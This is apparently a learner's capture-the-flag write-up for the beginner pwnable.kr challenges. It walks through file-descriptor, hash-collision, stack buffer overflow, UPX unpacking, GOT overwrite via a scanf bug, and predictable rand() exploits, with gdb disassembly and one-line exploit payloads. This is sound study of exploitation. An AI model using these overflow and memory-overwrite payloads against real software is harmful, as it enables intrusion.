How to access the challenge in the first place:
1. go to pwnable.kr using a web browser
2. get access to a terminal that can use ssh (since I have Windows, I downloaded a Linux VM on VirtualBox)
3. open a terminal and type in the ssh statement in the challenge description
4. you should have access, you can now use terminal commands like ls to look through the beginning levels for files

-----------------------------------------
Fd

int fd = atoi( argv[1] ) - 0x1234;
int len = 0;
len = read(fd, buf, 32);
if(!strcmp("LETMEWIN\n", buf)){
	printf("good job :)\n");
	system("/bin/cat flag");
	exit(0);
}

This is the important part of the code. On first glance, the obvious thing to manipulate is the fd variable, which can be controlled with input. Then you can use the fd in the read method. But how is that relevant? That requires reading up a little more, but basically if fd is 0, then read takes in input from stdin. 

Since fd is subtracted 0x1234 (or 4660), in order to make fd 0, input a 4660.

That doesn't get you the flag, though - the strcmp function checks if buf (or now your input) is equal to LETMEWIN\n, so just type that into the terminal and you should get your flag.

Solution:
4660
LETMEWIN\n

-----------------------------------------
Collision

unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

After looking through the program, I realized that in order to get the flag, the return value of the check_password function must be equivalent to hashcode (0x21DD09EC). But how do I actually get there?

check_password takes in a 20 character string, and essentially reads it in 4 characters at a time and then adds them for the final result. So if you had a string like "\x11" * 20, the return value would be "\x55\x55\x55\x55". So all you basically need to do is come up with five four byte strings that add up to 0x21DD09EC. 

The way I did it makes the five strings add up to 121DD09EC (notice the additional 1 at the front), and it works because res only accounts for the last 8 digits.

I initially came up with the string of "\x33" * 16 + "\x20\x3d\x10\x55", but the final string ends with a 20 (little-endian makes the actual string 55103d20). 
I soon realized though that the program had issues with 0 ending the string, so I had to ensure that the final byte wasn't a 0 in each of the four byte strings. So, I instead had to do "\x33" * 12 + "\x32\x33\x33\x33\x21\x3d\x10\x55".

Solution:
./col $(python -c 'print "\x33" * 12 + "\x32\x33\x33\x33\x21\x3d\x10\x55"')


-----------------------------------------
Bof

void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}

So this particular challenge talked about the issue of buffer overflow. The first thing to realize is that the array overflowme doesn't have a size limit, and as such, giving the array more than 32 characters makes the data you put in overflow into memory you're not supposed to have access to. So we want to overflow the value of key, which currently is 0xdeadbeef, with the value of 0xcafebabe, so that we can end up with a shell. 

The problem now is how much I need to overflow before I can finally access the memory for key. I could just randomly put in A's and then add in a \xfe\xca\xbe\ba, but I instead used gdb to find the exact value. 

I booted up gdb and disassembled the func function to get this in assembly:
gdb-peda$ disas func
Dump of assembler code for function func:
   0x8000062c <+0>:	push   ebp
   0x8000062d <+1>:	mov    ebp,esp
   0x8000062f <+3>:	sub    esp,0x48
=> 0x80000632 <+6>:	mov    eax,gs:0x14
   0x80000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x8000063b <+15>:	xor    eax,eax
   0x8000063d <+17>:	mov    DWORD PTR [esp],0x8000078c
   0x80000644 <+24>:	call   0xb7e630d0 <_IO_puts>
   0x80000649 <+29>:	lea    eax,[ebp-0x2c]
   0x8000064c <+32>:	mov    DWORD PTR [esp],eax
   0x8000064f <+35>:	call   0xb7e62820 <_IO_gets>
   0x80000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x8000065b <+47>:	jne    0x8000066b <func+63>
   0x8000065d <+49>:	mov    DWORD PTR [esp],0x8000079b
   0x80000664 <+56>:	call   0xb7e3e850 <__libc_system>
   0x80000669 <+61>:	jmp    0x80000677 <func+75>
   0x8000066b <+63>:	mov    DWORD PTR [esp],0x800007a3
   0x80000672 <+70>:	call   0xb7e630d0 <_IO_puts>
   0x80000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x8000067a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x80000681 <+85>:	je     0x80000688 <func+92>
   0x80000683 <+87>:	call   0xb7ef9560 <__stack_chk_fail>
   0x80000688 <+92>:	leave  
   0x80000689 <+93>:	ret   

The important line in all the assembly above is 0x80000654, or func+40. That line compares the value of ebp+8 (presumably key's memory location) with the value of 0xcafebabe. So I set a breakpoint there.

On the way to accessing the breakpoint, I was asked to give input for the overflow me buffer, which I proceeded to overflow with a random amount of A's.

At the breakpoint, I then examine the registers to see where the value of the overflowme variable is.

Since I use gdb-peda, the stack data shown shows me that the variable is at 0xbffff3cc.

0000| 0xbffff3b0 --> 0xbffff3cc ('A' <repeats 47 times>)
0004| 0xbffff3b4 --> 0xbffff454 --> 0x3b2cb624 
0008| 0xbffff3b8 --> 0xb7fb3000 --> 0x1aedb0 
0012| 0xbffff3bc --> 0x9027 
0016| 0xbffff3c0 --> 0xffffffff 
0020| 0xbffff3c4 --> 0x2f ('/')
0024| 0xbffff3c8 --> 0xb7e10dc8 --> 0x2b76 ('v+')
0028| 0xbffff3cc ('A' <repeats 47 times>)

Since I know that overflowme is at 0xbffff3cc and $ebp+8 (aka key variable) is at 0xbffff400, I can calculate that 0xbffff400 - 0xbffff3cc = 52. So I need to overflow 52 characters into overflowme and then add 0xcafebabe to finally overwrite the key variable.

In the solution below, besides the standard python script, the ; cat - is necessary to keep the program open while I utilize the open shell.

Solution:
(python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000


-----------------------------------------
Flag

So, I initially tried to open the file in GDB, then tried to disassemble the main function. However, GDB told me that it couldn't locate the file in question, which was weird. So I instead took an alternate approach and used the strings command on the flag program, which quickly revealed to me in this particular part of the output:

ACG?
'_(H
USQRH
PROT_EXEC|PROT_WRITE failed.
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $
_j<X
Ph^)-
j2AZE)
/proc/self/exe

that the flags executable was packed with UPX. So I unpacked with UPX (upx -d ./flag) to get a file I can actually disassemble.

gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000401164 <+0>:	push   rbp
   0x0000000000401165 <+1>:	mov    rbp,rsp
   0x0000000000401168 <+4>:	sub    rsp,0x10
   0x000000000040116c <+8>:	mov    edi,0x496658
   0x0000000000401171 <+13>:	call   0x402080 <puts>
   0x0000000000401176 <+18>:	mov    edi,0x64
   0x000000000040117b <+23>:	call   0x4099d0 <malloc>
   0x0000000000401180 <+28>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401184 <+32>:	mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 <flag>
   0x000000000040118b <+39>:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040118f <+43>:	mov    rsi,rdx
   0x0000000000401192 <+46>:	mov    rdi,rax
   0x0000000000401195 <+49>:	call   0x400320
   0x000000000040119a <+54>:	mov    eax,0x0
   0x000000000040119f <+59>:	leave  
   0x00000000004011a0 <+60>:	ret    
End of assembler dump.
gdb-peda$ x/10s *0x6c2070
0x496628:	"UPX...? sounds like a delivery service :)"
0x496652:	""
0x496653:	""
0x496654:	""
0x496655:	""
0x496656:	""
0x496657:	""
0x496658:	"I will malloc() and strcpy the flag there. take it."
0x49668c:	"FATAL: kernel too old\n"
0x4966a3:	"/dev/urandom"

The searching for the actual flag was made easier by the comment found in the disassembly.

Solution:
upx -d ./flag
gdb flag
x/10s *0x6c2070

-----------------------------------------
Passcode

Error: I kept piping in input and then wondering why the scanf method refused to accept further input... goes to show that I"m a dumbass and still have a lot to learn. Piped in input essentially is all the input the program's going to receive. Welp. Learned something new.

So the first thing I did was run the program - I checked if passcode could accept 338150 (which it couldn't, it seg faulted). So I then decided to take a look at the welcome function. I wasn't really sure what to expect, but I filled the name array with 100 A's (the welcome function limited input size), and took a look in GDB.

I found that the passcode1 variable is at $ebp-10, passcode2 variable is at $ebp-0c, and that the name array is at $ebp-70. Since the offsets are in hex, 0x70-0x10 = 96. This means that the remaining 4 spots are unaccounted for, and that I'm able to control the value for passcode1. As evidence, when I tested passcode1's value in GDB, it was 0x41414141, which is hex for AAAA.

However, just this alone isn't enough.

printf("enter passcode1 : ");
scanf("%d", passcode1);
fflush(stdin);

The above code in the login function also possesses a bug: scanf should accept &passcode1, not passcode1. As a result, scanf will read in a value and store it at the memory position with passcode1's value. This means that I now can write any value to any place in memory.

Dump of assembler code for function login:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	sub    $0x28,%esp
   0x0804856a <+6>:	mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
   0x0804857c <+24>:	mov    -0x10(%ebp),%edx
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    $0x8048786,%eax
   0x0804859d <+57>:	mov    %eax,(%esp)
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    $0x8048783,%eax
   0x080485aa <+70>:	mov    -0xc(%ebp),%edx
   0x080485ad <+73>:	mov    %edx,0x4(%esp)
   0x080485b1 <+77>:	mov    %eax,(%esp)
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	movl   $0x8048799,(%esp)
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
=> 0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   0x080485f1 <+141>:	movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	movl   $0x0,(%esp)
   0x08048604 <+160>:	call   0x8048480 <exit@plt>


The way I did it, I used login+47 (the call to fflush) as a basis to find what to overwrite. Since login+47 calls (or jumps to) the position at 0x8048430, I can instead overwrite the position (which I don't know and shouldn't matter) with login+127's value, which is essentially just system("/bin/cat flag").

Another thing that tripped me was the scanf accepted only %d, so that attempting to give it the hex value for login+127 wouldn't work. Therefore, you have to convert login+127 (0x080485e3) to its decimal component, 134514147.

Solution:
(python -c 'print "A" *96 + "\x04\xa0\x04\x08" + "134514147"') | ./passcode

-----------------------------------------
Random

So the hint given was that random isn't really random. So I booted up GDB, and took a look at the disassembly:

(gdb) disas main
Dump of assembler code for function main:
   0x00000000004005f4 <+0>:	push   %rbp
   0x00000000004005f5 <+1>:	mov    %rsp,%rbp
   0x00000000004005f8 <+4>:	sub    $0x10,%rsp
   0x00000000004005fc <+8>:	mov    $0x0,%eax
   0x0000000000400601 <+13>:	callq  0x400500 <rand@plt>
   0x0000000000400606 <+18>:	mov    %eax,-0x4(%rbp)
   0x0000000000400609 <+21>:	movl   $0x0,-0x8(%rbp)
   0x0000000000400610 <+28>:	mov    $0x400760,%eax
   0x0000000000400615 <+33>:	lea    -0x8(%rbp),%rdx
   0x0000000000400619 <+37>:	mov    %rdx,%rsi
   0x000000000040061c <+40>:	mov    %rax,%rdi
   0x000000000040061f <+43>:	mov    $0x0,%eax
   0x0000000000400624 <+48>:	callq  0x4004f0 <__isoc99_scanf@plt>
   0x0000000000400629 <+53>:	mov    -0x8(%rbp),%eax
   0x000000000040062c <+56>:	xor    -0x4(%rbp),%eax
   0x000000000040062f <+59>:	cmp    $0xdeadbeef,%eax
   0x0000000000400634 <+64>:	jne    0x400656 <main+98>
   0x0000000000400636 <+66>:	mov    $0x400763,%edi
   0x000000000040063b <+71>:	callq  0x4004c0 <puts@plt>
   0x0000000000400640 <+76>:	mov    $0x400769,%edi
   0x0000000000400645 <+81>:	mov    $0x0,%eax
   0x000000000040064a <+86>:	callq  0x4004d0 <system@plt>
   0x000000000040064f <+91>:	mov    $0x0,%eax
   0x0000000000400654 <+96>:	jmp    0x400665 <main+113>
   0x0000000000400656 <+98>:	mov    $0x400778,%edi
   0x000000000040065b <+103>:	callq  0x4004c0 <puts@plt>
   0x0000000000400660 <+108>:	mov    $0x0,%eax
   0x0000000000400665 <+113>:	leaveq 
   0x0000000000400666 <+114>:	retq   

I see that the key ^ random line takes place at main+56, or the xor command. From that, I can figure out that key is either %rbp-4 or $rbp-8. I just randomly inputted a value and reran the program (changing input values) to figure out that key is located at $rbp-8. This means that $rbp-4 is the random value. I ran the program several times, and each time, $rbp-4 seemed to have the value of 0x6b8b4567.

I then xor'd 0x6b8b4567 with 0xdeadbeef to get 0xb526fb88. However, the job still isn't done, as key accepts an integer value. So I convert 0xb526fb88 to 3039230856 to get my final answer.

Solution:
3039230856